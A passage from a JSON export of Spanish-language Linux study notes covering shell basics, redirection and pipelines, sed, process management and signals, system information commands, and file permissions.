    "content": "\r\n# Introducción\r\n\r\n## Shell. Comandos básicos\r\n\r\n```zsh\r\n# Limpiar la consola\r\nclear\r\n# Ver historial de comandos utilizados\r\nhistory\r\n# Lista el directorio actual\r\nls\r\n# Tipo de comando\r\ntype ls\r\n# Con parámetros (l = long list, s = size, h = human readable)\r\nls -lah\r\n# Información de un comando de \"shell\"\r\nhelp type\r\n# Información de  un comando que \"no es de shell\"\r\nls --help\r\n# Manual de un comando\r\nman ls\r\n# Para que es un comando\r\nwhatis ls\r\n# Información detallada de un comando\r\ninfo ls\r\n# Buscar comandos por palabra clave\r\napropos directory\r\napropos \"list directory\"\r\n# Partir un comando en varias líneas\r\nls \\\r\n-lah\r\nDirectory\r\n# Concatenar comandos\r\nclear ; ls\r\n# Operador AND (&&)\r\ndsfasfasdf && ls\r\n# Operador OR (||)\r\nlkajsdfasdf || ls\r\n```\r\n\r\n## Shell. Atajos\r\n\r\n```sh\r\n# Ir a inicio de línea\r\nControl + a\r\n# Ir al final de línea\r\nControl + e\r\n# Limpiar pantalla\r\nControl + l\r\n# Últimos comandos utilizados\r\nControl + p\r\n# Buscar comandos utilizados\r\nControl + r\r\n# Utilizar el último comando que machea (coincide)\r\n!ls\r\n# Moverse derecha/izquierda\r\nControl + b # back\r\nControl + f # forward\r\n# Argumento último comando\r\nAlt + .\r\n$!\r\n# Autocompletar comandos\r\nTab\r\n# Cortar la línea (situado al inicio)\r\nControl + k\r\n# Pegar la línea\r\nControl + y\r\n# Copiar/pegar texto con ratón\r\nSeleccionar texto + ruleta\r\n# Convertir mayúsculas/minúsculas\r\nAlt + l/u\r\n# Intercambiar 2 últimos caracteres\r\nControl + t\r\n# Intercambiar 2 últimas palabras\r\nEsc + t\r\n```\r\n\r\n## Shell. Alias\r\n\r\n```sh\r\n# Crear un Alias\r\nalias clist='clear ; ls'\r\n# Conecer Alias en la sesión\r\nalias\r\n```\r\n\r\n## Shell. Is Hashed\r\n\r\nEs una tabla de referencias a comandos para acceder a ellos mucho más rápido\r\n\r\n```sh\r\n# Mostrar tabla de hash de la sesión actual\r\nhash\r\n# Limpiar la tabla para la sesióna actual\r\nhash -a\r\n```\r\n",
    "path": "/systems/linux/intro"
  },
  {
    "id": 68,
    "title": "Redirecciones y pipelines",
    "content": "\r\n# Redirecciones y pipelines\r\n\r\n## I/O Redirection\r\n\r\nLa redirección de entrada/salida (I/O) es un mecanismo que permite cambiar la fuente o el destino de los flujos de entrada y salida de un comando en un sistema operativo Unix/Linux. Los flujos de entrada y salida estándar son:\r\n\r\n- /dev/stdin: entrada estándar\r\n- /dev/stdout: salida estándar\r\n- /dev/stderr: salida de error\r\n\r\n## Standard Output (stdout)\r\n\r\nLa redirección de la salida estándar (stdout) permite enviar la salida de un comando a un archivo en lugar de a la pantalla. Para redirigir la salida estándar a un archivo, se utiliza el operador `>` seguido del nombre del archivo.\r\n\r\n```sh\r\n# Redirigir la salida estándar a un archivo\r\ncomando > archivo\r\n# Concatenar la salida estándar a un archivo\r\ncomando >> archivo\r\n```\r\n\r\n## Standard Error (stderr)\r\n\r\nLa redirección de la salida de error (stderr) permite enviar los mensajes de error generados por un comando a un archivo en lugar de a la pantalla. Para redirigir la salida de error a un archivo, se utiliza el operador `2>` seguido del nombre del archivo.\r\n\r\n```sh\r\n# Redirigir la salida de error a un archivo\r\ncomando 2> archivo\r\n# Concatenar la salida de error a un archivo\r\ncomando 2>> archivo\r\n```\r\n\r\n### Redirección de la salida estándar y de error\r\n\r\nLa redirección de la salida estándar y de error permite enviar tanto la salida estándar como la salida de error a un archivo. Para redirigir la salida estándar y de error a un archivo, se utiliza el operador `&>` seguido del nombre del archivo.\r\n\r\n```sh\r\n# Redirigir la salida estándar y de error a un archivo\r\ncomando &> archivo\r\n# Concatenar la salida estándar y de error a un archivo\r\ncomando &>> archivo\r\n# Antiguamente\r\ncomando > archivo 2>&1\r\n```\r\n\r\n## /dev/null\r\n\r\nEl archivo especial `/dev/null` es un dispositivo de nulo que descarta toda la entrada que recibe y devuelve un final de archivo (EOF, End Of File) inmediatamente. Se utiliza para redirigir la salida estándar o de error a la nada.\r\n\r\n```sh\r\n# Redirigir la salida estándar a /dev/null\r\ncomando > /dev/null\r\n# Redirigir la salida de error a /dev/null\r\ncomando 2> /dev/null\r\n# Redirigir la salida estándar y de error a /dev/null\r\ncomando &> /dev/null\r\n# Ejemplo: redirigir la salida de error a /dev/null\r\nfind /var/log -name auth.log 2> /dev/null\r\n```\r\n\r\n## Standar Input (stdin)\r\n\r\nLa redirección de la entrada estándar (stdin) permite enviar un archivo como entrada a un comando en lugar de introducir los datos manualmente. Para redirigir la entrada estándar a un comando, se utiliza el operador `<` seguido del nombre del archivo.\r\n\r\n>cat recibe la entrada estándar y la imprime en la salida estándar.\r\n\r\n```sh\r\n# Redirigir la entrada estándar a un comando\r\ncomando < archivo\r\n# Ejemplo: contar las líneas de un archivo\r\nwc -l < archivo\r\n# Añadir varias líneas a un archivo\r\ncat << EOF > archivo\r\nlínea 1\r\nlínea 2\r\nEOF\r\n# Sin EOF\r\ncat > archivo\r\n```\r\n\r\n## Pipelines\r\n\r\nUn pipeline es una secuencia de comandos conectados por tuberías (pipes) que permite enviar la salida de un comando como entrada a otro comando. Para crear un pipeline, se utiliza el operador `|` entre los comandos.\r\n\r\n>xargs: convierte la salida de un comando en argumentos de otro comando.\r\n\r\n```sh\r\n# Pipeline: comando1 | comando2\r\ncomando1 | comando2\r\n# Ejemplo: contar las líneas de un archivo\r\ncat archivo | wc -l\r\n# Ejemplo: buscar un archivo y contar las líneas\r\nfind /var/log -name auth.log | xargs wc -l\r\n# Ejemplo con ls\r\nls -l /usr/bin | less\r\n```\r\n\r\n## Filtros y búsquedas: sort, uniq, wc\r\n\r\nLos filtros y búsquedas son comandos que permiten manipular y buscar información en los flujos de entrada y salida. Algunos de los filtros y búsquedas más comunes son:\r\n\r\n- `sort`: Ordena las líneas de un archivo.\r\n- `uniq`: Filtra líneas duplicadas consecutivas.\r\n- `wc`: Cuenta las líneas, palabras y caracteres de un archivo.\r\n\r\n```sh\r\n# Ordenar las líneas de un archivo\r\nsort archivo\r\n# Filtrar líneas duplicadas consecutivas\r\nuniq archivo\r\n# Contar las líneas, palabras y caracteres de un archivo\r\nwc archivo\r\n# Ejemplo de ls + sort + uniq + less\r\nls -l /bin /usr/bin | sort | uniq | less\r\n# Ver los duplicados de anterior\r\nls -l /bin /usr/bin | sort | uniq -d | less\r\n# Ejemplo de wc\r\n# Salida: líneas palabras caracteres archivo\r\nwc /var/log/auth.log\r\n# Cuantos ficheros hay en /usr/bin\r\nls -l /bin /usr/bin | uniq | wc -l\r\n```\r\n\r\n## Filtros y búsquedas: grep, head, tail, tee\r\n\r\nOtros filtros y búsquedas comunes son:\r\n\r\n- `grep`: Busca líneas que contienen un patrón.\r\n- `head`: Muestra las primeras líneas de un archivo.\r\n- `tail`: Muestra las últimas líneas de un archivo.\r\n- `tee`: Divide la salida de un comando en un archivo y la pantalla.\r\n\r\n```sh\r\n# Buscar líneas que contienen un patrón\r\ngrep patrón archivo\r\n# Mostrar las primeras líneas de un archivo\r\nhead archivo\r\n# Mostrar las últimas líneas de un archivo\r\ntail archivo\r\n# Dividir la salida de un comando en un archivo y la pantalla\r\ncomando | tee archivo\r\n# Ejemplo de grep\r\ngrep $USER /var/log/auth.log\r\n# Ejemplo de grep ignorando mayúsculas y minúsculas\r\ngrep -i $USER /var/log/auth.log\r\n# Ejemplo de grep ignorando líneas que contienen un patrón\r\ngrep -v $USER archivo\r\n# Ejemplo de head\r\nhead -n 10 /var/log/auth.log\r\n# Ejemplo de tail\r\ntail -n 10 /var/log/auth.log\r\n# Ver cambios de fichero en tiempo real con tail\r\ntail -f /var/log/auth.log\r\n# Ejemplo de tee\r\nls -l /usr/bin | tee lista.txt\r\n# tee para volcar la salida de un comando a un fichero y a la salida estándar\r\nls -l /usr/bin | tee lista.txt | less\r\n```\r\n\r\n## Ejercicios\r\n\r\n- Muestra por pantalla todos los archivos y directorios que tienes en tu directorio de trabajo ordenados por tamaño\r\n\r\n```sh\r\nls -lS ~\r\nls -l ~ | sort -h -rk5\r\n# h human readable\r\n# r reverse\r\n# k key\r\n```\r\n\r\n- Crea un nuevo fichero en tu sistema Linux ejecutando el siguiente comando:\r\n\r\n> echo -e \"rojo,1,coche,madrid\\nazul,4,moto,mexico\\namarillo,2,bicicleta,paris\\nverde,6,avion,roma\" > fichero.csv\r\n\r\nOrdena el fichero que acabas de crear (fichero.csv) por el segundo campo teniendo en cuenta que los campos están separados por el delimitador ,\r\n\r\n```sh\r\nsort -t ',' -nk2 fichero.csv\r\n# t delimitador\r\n# n numérico\r\n# k key\r\n```\r\n\r\n## Comando sed\r\n\r\nEl comando `sed` (stream editor) es un editor de flujo que permite realizar operaciones de búsqueda y sustitución en un flujo de texto. Algunas de las operaciones más comunes que se pueden realizar con `sed` son:\r\n\r\n- `s`: Sustituye un patrón por otro.\r\n- `d`: Borra líneas que coinciden con un patrón.\r\n- `p`: Imprime líneas que coinciden con un patrón.\r\n\r\n```sh\r\n# Sustituir un patrón por otro\r\nsed 's/patrón/sustitución/' archivo\r\n# Sustituir todas las ocurrencias de un patrón\r\nsed 's/patrón/sustitución/g' archivo\r\n# Sustituir un patrón por otro en un rango de líneas\r\nsed 'inicio,fin s/patrón/sustitución/' archivo\r\n# Sustituir un patrón por otro en un rango de líneas y guardar el resultado en un nuevo archivo\r\nsed 'inicio,fin s/patrón/sustitución/' archivo > nuevo_archivo\r\n# Borrar líneas que coinciden con un patrón\r\nsed '/patrón/d' archivo\r\n# Imprimir líneas que coinciden con un patrón\r\nsed -n '/patrón/p' archivo\r\n# Imprimir líneas que coinciden con un patrón y guardar el resultado en un nuevo archivo\r\nsed -n '/patrón/p' archivo > nuevo_archivo\r\n```\r\n\r\n### Ejemplos de uso de sed\r\n\r\n- Reemplazar o sustituir una cadena de texto en un fichero\r\n\r\n```sh\r\nsed 's/rojo/azul/g' fichero.txt\r\n```\r\n\r\n- Reemplazar una cadena de texto en una línea determinada de un fichero\r\n\r\n```sh\r\nsed '2 s/rojo/azul/' fichero.txt\r\n```\r\n\r\n- Añadir un carácter al comienzo de cada línea de un fichero\r\n\r\n```sh\r\nsed 's/^/-->/g' fichero.txt\r\n```\r\n",
    "path": "/systems/linux/io-redirection"
  },
  {
    "id": 69,
    "title": "links",
    "content": "\r\n- **UFW Essentials: Reglas y comandos comunes de firewall**\r\n\r\n  [https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands](https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands)\r\n\r\n- **Configuración inicial servidor Ubuntu 18.04**\r\n\r\n  [https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-18-04)\r\n\r\n- **Configurar servidor OpenVPN en ubuntu 18-04**\r\n\r\n  [https://www.digitalocean.com/community/tutorials/como-configurar-un-servidor-de-openvpn-en-ubuntu-18-04-es](https://www.digitalocean.com/community/tutorials/como-configurar-un-servidor-de-openvpn-en-ubuntu-18-04-es)\r\n\r\n- **Instalar VPN en Ubuntu 20.04 - Solvetic**\r\n\r\n  [https://www.solvetic.com/tutoriales/article/8441-como-instalar-vpn-en-ubuntu-20-04/](https://www.solvetic.com/tutoriales/article/8441-como-instalar-vpn-en-ubuntu-20-04/)\r\n",
    "path": "/systems/linux/links"
  },
  {
    "id": 70,
    "title": "manuals",
    "content": "\r\n- [Aprende Linux](./static/aprende-linux.pdf)\r\n- [Comandos básicos Linux](./static/comandos-basicos.pdf)\r\n- [Introducción comandos Linux](./static/introduccion-comandos-linux.pdf)\r\n- [Introducción scripts Bash](./static/introduccion_scripts_bash.pdf)\r\n- [Manual de referencia](./static/mcgrawgill-manual-de-referencia.pdf)\r\n- [Sistema operativo Linux 2º Edición](./static/sistema-operativo-linux-2-edicion.pdf)\r\n",
    "path": "/systems/linux/manuals"
  },
  {
    "id": 71,
    "title": "Procesos",
    "content": "\r\n# Procesos\r\n\r\n## Introducción\r\n\r\nUn proceso es un programa en ejecución. Cada proceso tiene un identificador único llamado PID (Process IDentifier). Los procesos se crean mediante la llamada al sistema `fork()`. El proceso que llama a `fork()` se denomina proceso padre y el proceso creado se denomina proceso hijo. El proceso hijo es una copia exacta del proceso padre, pero con un PID diferente. El proceso hijo puede ejecutar un programa diferente al del proceso padre mediante la llamada al sistema `exec()`. El proceso hijo puede terminar su ejecución mediante la llamada al sistema `exit()`. El proceso padre puede esperar a que el proceso hijo termine su ejecución mediante la llamada al sistema `wait()`.\r\n\r\n> **Nota**: En Linux, los procesos se organizan en un árbol de procesos. El proceso raíz es el proceso init, que es el primer proceso que se ejecuta en el sistema. Todos los demás procesos son descendientes de init.\r\n\r\nLos procesos se encuentran en el directorio `/proc`. Cada proceso tiene un directorio con su PID como nombre. En este directorio se encuentran varios archivos que contienen información sobre el proceso, como el estado del proceso, el uso de la CPU, la memoria, los archivos abiertos, etc.\r\n\r\nCon el comando `pidof` se puede obtener el PID de un proceso a partir de su nombre. Por ejemplo, para obtener el PID del proceso `bash` se puede ejecutar el siguiente comando:\r\n\r\n```sh\r\n# pidof\r\n\r\n```\r\n\r\n## Visualización estática\r\n\r\n- PID: Identificador del proceso.\r\n- PPID: Identificador del proceso padre.\r\n- UID: Identificador del usuario que ha lanzado el proceso.\r\n- STIME: Hora de inicio del proceso.\r\n- %CPU: Porcentaje de uso de la CPU.\r\n- %MEM: Porcentaje de uso de la memoria.\r\n- VSZ: Tamaño virtual del proceso.\r\n- RSS: Tamaño real del proceso.\r\n- TTY: Terminal asociada al proceso.\r\n- STAT: Estado del proceso.\r\n    - R: Ejecución.\r\n    - S: Sueño.\r\n    - T: Parado.\r\n    - Z: Zombie.\r\n    - s: Proceso líder de sesión.\r\n    - +: Proceso en segundo plano.\r\n    - \\<: Proceso de alta prioridad.\r\n    - N: Proceso con baja prioridad.\r\n    - l: Proceso multihilo.\r\n- TIME: Tiempo de CPU consumido por el proceso.\r\n- CMD: Comando que se está ejecutando.\r\n\r\n```bash\r\n# Procesos asociados a la terminal actual\r\nps\r\n# Procesos de todos los usuarios\r\nps -e\r\n# Procesos de todos los usuarios con más información\r\nps -ef\r\n# Procesos de todos los usuarios con más información y árbol de procesos\r\nps -ef --forest\r\n# Más información sobre los procesos\r\nps aux | less\r\n```\r\n\r\n## Visualización dinámica\r\n\r\n- top: hora de inicio del proceso.\r\n- up: tiempo que lleva el sistema en funcionamiento.\r\n- load average: carga media del sistema en los últimos 1, 5 y 15 minutos.\r\n- tasks: número de tareas en ejecución, en espera y detenidas.\r\n- %Cpu(s): porcentaje de uso de la CPU.\r\n- Mem: memoria total, usada, libre, compartida, búfer y caché.\r\n- Swap: memoria de intercambio total, usada y libre.\r\n- PID: identificador del proceso.\r\n- USER: usuario que ha lanzado el proceso.\r\n- PR: prioridad del proceso.\r\n- NI: nivel de planificación del proceso.\r\n- VIRT: tamaño virtual del proceso.\r\n- RES: tamaño real del proceso.\r\n- SHR: tamaño compartido del proceso.\r\n- S: estado del proceso.\r\n- %CPU: porcentaje de uso de la CPU.\r\n- %MEM: porcentaje de uso de la memoria.\r\n- TIME+: tiempo de CPU consumido por el proceso.\r\n- COMMAND: comando que se está ejecutando.\r\n\r\n\r\n\r\n```bash\r\n# Actualizar la información cada 1 segundo\r\ntop\r\n# Top abierto. Tiempo de actualización\r\ns\r\n# Top abierto. Cambiar unidad de consumo\r\ne\r\n# Top abierto. Filtrar por usuario\r\nu\r\n# Top abierto. Filtro personalizado\r\no # Por ejemplo, %CPU > 2\r\n```\r\n\r\n## Interrumpir procesos\r\n\r\n- Ctrl + C: enviar la señal SIGINT al proceso. El proceso se detiene y se envía al segundo plano.\r\n- Ctrl + Z: enviar la señal SIGTSTP al proceso. El proceso se detiene y se envía al segundo plano.\r\n- kill: enviar una señal a un proceso. Por defecto, envía la señal SIGTERM.\r\n- killall: enviar una señal a todos los procesos que coincidan con un nombre. Por defecto, envía la señal SIGTERM.\r\n- pkill: enviar una señal a todos los procesos que coincidan con un patrón. Por defecto, envía la señal SIGTERM.\r\n- xkill: matar un proceso con el ratón. Seleccionar la ventana del proceso y hacer clic en ella.\r\n\r\n```bash\r\n# Reaunudar un proceso detenido\r\nbg %1\r\n# Enviar la señal SIGINT al proceso\r\nkill -2 PID\r\n# Enviar la señal SIGKILL al proceso\r\nkill -9 PID\r\n# Enviar la señal SIGTERM al proceso\r\nkill -15 PID\r\n# Enviar la señal SIGSTOP al proceso\r\nkill -19 PID\r\n# Enviar la señal SIGCONT al proceso\r\nkill -18 PID\r\n# Enviar la señal SIGTSTP al proceso\r\nkill -20 PID # Ctrl + Z\r\nkill -TSTP PID\r\n```\r\n\r\n# Segundo plano\r\n\r\nUn proceso en segundo plano es un proceso que se ejecuta en segundo plano sin bloquear la terminal. Para ejecutar un proceso en segundo plano, se añade el carácter `&` al final del comando. Para enviar un proceso en primer plano a segundo plano, se ejecuta el comando `bg`. Para enviar un proceso en segundo plano a primer plano, se ejecuta el comando `fg`.\r\n\r\n```bash\r\n# Ejecutar un proceso en segundo plano\r\nsleep 10 &\r\n# Enviar un proceso en primer plano a segundo plano\r\nbg %1\r\n# Ver los procesos en segundo plano\r\njobs\r\n# Enviar un proceso en segundo plano a primer plano\r\nfg %1\r\n```\r\n\r\n# Señales (Signals)\r\n\r\nLas señales son mensajes que se envían a un proceso para notificarle un evento. Las señales se pueden enviar a un proceso mediante el comando `kill`. Algunas señales comunes son:\r\n\r\n- SIGINT: señal de interrupción. Se envía al pulsar Ctrl + C.\r\n- SIGTSTP: señal de parada. Se envía al pulsar Ctrl + Z.\r\n\r\n",
    "path": "/systems/linux/process"
  },
  {
    "id": 72,
    "title": "Cliente",
    "content": "\r\n## Información del sistema\r\n\r\n```sh\r\nlsb_release --help\r\nuname --help\r\n```\r\n\r\n- **mostrará la arquitectura de tu ordenador.**\r\n\r\n  ```sh\r\n  arch\r\n  dpkg --print-architecture\r\n  uname -a\r\n  ```\r\n\r\n- **CPU Información**\r\n\r\n  ```sh\r\n  cat /proc/cpuinfo\r\n  grep \"model name\" /proc/cpuinfo\r\n  ```\r\n\r\n- **Número de CPUS**\r\n\r\n  ```sh\r\n  grep \"model name\" /proc/cpuinfo | wc -l\r\n  ```\r\n\r\n- **mostrará la versión del kernel que está usado.**\r\n\r\n  ```sh\r\n  uname -r\r\n  ```\r\n\r\n- **mostrará los componentes de hardware presentes en el sistema.**\r\n\r\n  ```sh\r\n  dmidecode -q\r\n  ```\r\n\r\n- **mostrará las características del disco duro que le indiques.**\r\n\r\n  ```sh\r\n  hdparm -i /dev/hda\r\n  ```\r\n\r\n- **mostrará la información sobre la CPU.**\r\n\r\n  ```sh\r\n  cat /proc/cpuinfo\r\n  ```\r\n\r\n- **verificará el uso de memoria RAM.**\r\n\r\n  ```sh\r\n  cat /proc/meminfo\r\n  ```\r\n\r\n- **muestra el estado y uso de la memoria RAM.**\r\n\r\n  ```sh\r\n  free -m\r\n  ```\r\n\r\n- **mostrará los adaptadores de red y sus estadísticas.**\r\n\r\n  ```sh\r\n  cat /proc/net/dev\r\n  ```\r\n\r\n- **mostrará el sistema de archivos montado.**\r\n\r\n  ```sh\r\n  cat /proc/mounts\r\n  ```\r\n\r\n- **mostrará los dispositivos PCI presentes.**\r\n\r\n  ```sh\r\n  lspci -tv\r\n  ```\r\n\r\n- **mostrará los dispositivos USB conectados.**\r\n\r\n  ```sh\r\n  lsusb -tv\r\n  ```\r\n\r\n- **Listar procesos**\r\n\r\n  ```sh\r\n  top\r\n  htop # mejor visual y más opciones\r\n  ```\r\n\r\n- **Fechas y calendario**\r\n\r\n  ```sh\r\n  date\r\n  cal 2018\r\n  cal 05 2018\r\n  ```\r\n\r\n- **Mostrar manual**\r\n\r\n  ```sh\r\n  man ping\r\n  ```\r\n\r\n## Parámetros del sistema\r\n\r\n- Aumentar el número de tareas del usuario\r\n\r\n  1. Comentar y modificar\r\n\r\n     ```sh\r\n     /etc/systemd/logind.conf UserTasksMax\r\n     ```\r\n\r\n  2. Ejecutar\r\n\r\n     ```sh\r\n     sudo systemctl daemon-reload\r\n     sudo systemctl dademon-reexec\r\n     sudo service systemd-logind restart\r\n     # Opcional\r\n     # sudo service <service-name> restart\r\n     ```\r\n\r\n## Apagar y reiniciar\r\n\r\n- **Apagar**\r\n\r\n  ```sh\r\n  # reiniciará tu equipo inmediatamente\r\n  sudo shutdown -r now\r\n  # Reiniciar después de un tiempo determinado\r\n  sudo shutdown -r +<tiempo-deseado-en-minutos>\r\n  sudo shutdown -h +<tiempo-deseado-en-minutos>\r\n  # Reiniciar a una hora determinada\r\n  sudo shutdown -h <hora-deseada-(0-23)>\r\n  # cancelar un apagado planificado del sistema\r\n  sudo shutdown -c\r\n  ```\r\n\r\n- **Reiniciar**\r\n\r\n  ```sh\r\n  reboot\r\n  # mostrará un historial de cuando se realizaron los últimos reinicios.\r\n  last reboot\r\n  ```\r\n\r\n- **Cerrar sesión**\r\n\r\n  ```sh\r\n  logout\r\n  ```\r\n\r\n## Movimiento\r\n\r\n- **Te llevará directamente hasta la ruta que indiques, en este caso hasta el directorio “usuario”.**\r\n\r\n  ```sh\r\n  cd /home/usuario\r\n  ```\r\n\r\n- **retrocederás un nivel en la jerarquía de directorios.**\r\n\r\n  ```sh\r\n  cd ..\r\n  ```\r\n\r\n- **retrocederás 2 niveles en la jerarquía de directorios.**\r\n\r\n  ```sh\r\n  cd ../..\r\n  ```\r\n\r\n- **te llevará al directorio raíz de esa unidad.**\r\n\r\n  ```sh\r\n  cd\r\n  ```\r\n\r\n- **irás al directorio principal del usuario que indiques.**\r\n\r\n  ```sh\r\n  cd ~usuario\r\n  ```\r\n\r\n- **regresarás al directorio anterior.**\r\n\r\n  ```sh\r\n  cd –\r\n  ```\r\n\r\n## Listado\r\n\r\n- **mostrará la ruta del directorio donde te encuentras actualmente.**\r\n\r\n  ```sh\r\n  pwd\r\n  ```\r\n\r\n- **mostrará los archivos y carpetas del directorio donde te encuentras.**\r\n\r\n  ```sh\r\n  ls\r\n  ```\r\n\r\n- **mostrara los detalles de archivos y carpetas del directorio actual.**\r\n\r\n  ```sh\r\n  ls -l\r\n  ```\r\n\r\n- **mostrará los archivos ocultos del directorio actual**\r\n\r\n  ```sh\r\n  ls -a\r\n  ```\r\n\r\n## Variables de entorno\r\n\r\n- **Modificar las variables de entorno en todos los perfiles**\r\n\r\n  Editar el archivo /etc/bash.bashrc y añadir al final..., por ejemplo, para Java:\r\n\r\n  ```sh\r\n  export JAVA_HOME=/usr/lib/jvm/<home-java-version>\r\n  export PATH=$PATH:$JAVA_HOME\r\n  ```\r\n\r\n- **Refrescar los cambios sin salir del terminal**\r\n\r\n  ```sh\r\n  source /etc/bash.bashrc\r\n  ```\r\n\r\n- **Modificar las variables de entorno en todos los perfiles**\r\n\r\n  Editar el archivo /etc/bash.bashrc y añadir al final..., por ejemplo, para Java:\r\n\r\n  ```sh\r\n  export JAVA_HOME=/usr/lib/jvm/<home-java-version>\r\n  export PATH=$PATH:$JAVA_HOME\r\n  ```\r\n\r\n## Archivos y directorios\r\n\r\n### Crear, borrar, copiar y enlaces\r\n\r\n- **creará una nueva carpeta o directorio con nombre que le indiques. En este caso, “Directorio”.**\r\n\r\n  ```sh\r\n  mkdir Directorio\r\n  ```\r\n\r\n- **creará dos carpetas simultáneamente.**\r\n\r\n  ```sh\r\n  mkdir Directorio1 Directorio 2\r\n  ```\r\n\r\n- **borrará la carpeta llamada “Directorio”.**\r\n\r\n  ```sh\r\n  rmdir Directorio\r\n  ```\r\n\r\n- **eliminará una carpeta llamada “Directorio” y todo su contenido.**\r\n\r\n  ```sh\r\n  rm -rf Directorio\r\n  ```\r\n\r\n- **renombrará o moverá un archivo o carpeta.**\r\n\r\n  ```sh\r\n  mv Viejodirectorio Nuevodirectorio\r\n  ```\r\n\r\n- **copiará un archivo.**\r\n\r\n  ```sh\r\n  cp Archivo\r\n  ```\r\n\r\n- **copiará dos archivos simultáneamente.**\r\n\r\n  ```sh\r\n  cp Archivo1 Archivo2\r\n  ```\r\n\r\n- **copiará una carpeta completa, en este caso “Directorio”.**\r\n\r\n  ```sh\r\n  cp -a Directorio\r\n  ```\r\n\r\n- **copiará dos directorios simultáneamente.**\r\n\r\n  ```sh\r\n  cp -a Directorio1 Directorio2\r\n  ```\r\n\r\n- **creará un enlace simbólico con un determinado nombre, al archivo o directorio indicado.**\r\n\r\n  ```sh\r\n  ln -s Archivo Enlacearchivo\r\n  ```\r\n\r\n- **creará un enlace físico con el nombre indicado al archivo o directorio indicado**\r\n\r\n  ```sh\r\n  ln Archivo Enlacearchivo\r\n  ```\r\n\r\n### Búsquedas\r\n\r\n- **buscará ese archivo o directorio comenzado por la raíz del sistema.**\r\n\r\n  ```sh\r\n  find / -name Archivo\r\n  ```\r\n\r\n- **buscará archivos y directorios propiedad del usuario “Usuario”.**\r\n\r\n  ```sh\r\n  find / -user Usuario\r\n  ```\r\n\r\n- **buscará todos los archivos con la extensión que le indiques, en este caso “. bin”, dentro del directorio indicado, que en el ejemplo es “/ home/usuario”.**\r\n\r\n  ```sh\r\n  find /home/usuario -name \\*.bin\r\n  ```\r\n\r\n- **buscará los archivos creados o cambiados en el sistema dentro de los últimos “5” días.**\r\n\r\n  ```sh\r\n  find /usr/bin -type f -mtime -5\r\n  ```\r\n\r\n- **mostrará la ubicación de un archivo binario, de ayuda o fuente. En este caso pregunta dónde está “Firefox”.**\r\n\r\n  ```sh\r\n  Whereis firefox\r\n  ```\r\n\r\n- **mostrará la ruta completa al binario/ejecutable que le indiques**\r\n\r\n  ```sh\r\n  Which firefox\r\n  ```\r\n\r\n- **Buscar en todos los archivos de un directorio y sus subdirectorios**\r\n\r\n  ```sh\r\n  grep -i -R listen *\r\n  ```\r\n\r\n## Grupos, usuarios y permisos\r\n\r\n### Permisos\r\n\r\nFuente --> [https://blog.desdelinux.net/permisos-y-derechos-en-linux/](https://blog.desdelinux.net/permisos-y-derechos-en-linux/)\r\n\r\n- **Primer carácter de los archivos**\r\n\r\n  | Permiso | Identifica                                                         |\r\n  | ------- | ------------------------------------------------------------------ |\r\n  | -       | Archivo                                                            |\r\n  | d       | Directorio                                                         |\r\n  | b       | Archivo de bloques especiales (Archivos especiales de dispositivo) |\r\n  | c       | Archivo de caracteres especiales (Dispositivo tty, impresora...)   |\r\n  | l       | Archivo de vinculo o enlace (soft/symbolic link)                   |\r\n  | p       | Archivo especial de cauce (pipe o tubería)                         |\r\n\r\n- **Caracteres que definen los permisos**\r\n\r\n  | Permiso | Identifica  |\r\n  | ------- | ----------- |\r\n  | -       | Sin permiso |\r\n  | r       | Lectura     |\r\n  | w       | Escritura   |\r\n  | x       | Ejecución   |\r\n\r\n- **Estructura de permisos de archivos o directorios**\r\n\r\n  > Ejemplo: -rw-r--r-- ... archivo.pdf\r\n\r\n  | Tipo               | Usuario              | Grupo                | Resto de usuarios (otros) | Nombre del archivo           |\r\n  | ------------------ | -------------------- | -------------------- | ------------------------- | ---------------------------- |\r\n  | <center>-</center> | <center>rw-</center> | <center>r--</center> | <center>r--</center>      | <center>archivo.pdf</center> |\r\n\r\n- **Asignación de permisos**\r\n\r\n  | Parámetro | Nivel | Descripción                                    |\r\n  | --------- | ----- | ---------------------------------------------- |\r\n  | u         | dueño | dueño del archivo o directorio                 |\r\n  | g         | grupo | Grupo al que pertenece el archivo o directorio |\r\n  | o         | otros | Demás usuarios que no son dueño ni grupo       |\r\n\r\n- **Ejemplos de permisos**\r\n\r\n  ```sh\r\n  # Dar permiso de ejecución al dueño:\r\n  chmod u+x komodo.sh\r\n  # Quitar permiso de ejecución a todos los usuarios:\r\n  chmod -x komodo.sh\r\n  # Dar permiso de lectura y escritura a los demás usuarios:\r\n  chmod o+r+w komodo.sh\r\n  # Dejar solo permiso de lectura al grupo al que pertenece el archivo:\r\n  chmod g+r-w-x komodo.sh\r\n  ```\r\n\r\n- **Permisos en formato númerico octal**\r\n\r\n  `r = 4, w = 2, x = 1`\r\n\r\n  | Permiso              | Valor Octal        | Descripción                                                     |\r\n  | -------------------- | ------------------ | --------------------------------------------------------------- |\r\n  | <center>---</center> | <center>0</center> | no se tiene ningún permiso                                      |\r\n  | <center>--x</center> | <center>1</center> | solo permiso de ejecución                                       |\r\n  | <center>-w-</center> | <center>2</center> | solo permiso de escritura                                       |\r\n  | <center>-wx</center> | <center>3</center> | permisos de escritura y ejecución                               |\r\n  | <center>r--</center> | <center>4</center> | solo permiso de lectura                                         |\r\n  | <center>r-x</center> | <center>5</center> | permisos de lectura y ejecución                                 |\r\n  | <center>rw-</center> | <center>6</center> | permisos de lectura y escritura                                 |\r\n  | <center>rwx</center> | <center>7</center> | todos los permisos establecidos, lectura, escritura y ejecución |\r\n\r\n- **Ejemplos de permisos con octal**\r\n\r\n  | Permiso                      | Valor                | Descripción                                                                        |\r\n  | ---------------------------- | -------------------- | ---------------------------------------------------------------------------------- |\r\n  | <center>rw- --- ---</center> | <center>600</center> | Propietario = lectura y escritura                                                  |\r\n  | <center>rwx --x --x</center> | <center>711</center> | Propietario = lectura, escritura y ejecución, Grupo y otros = ejecución            |\r\n  | <center>rwx r-x r-x</center> | <center>755</center> | Propietario = lectura, escritura y ejecución, Grupos y otros = lectura y ejecución |\r\n  | <center>rwx rwx rwx</center> | <center>777</center> | Todos = lectura, escritura y ejecución                                             |\r\n  | <center>r-- --- ---</center> | <center>400</center> | Propietario = lectura                                                              |\r\n  | <center>rw- r-- ---</center> | <center>640</center> | Propietario = lectura y escritura, Grupo = lectura                                 |\r\n\r\n- 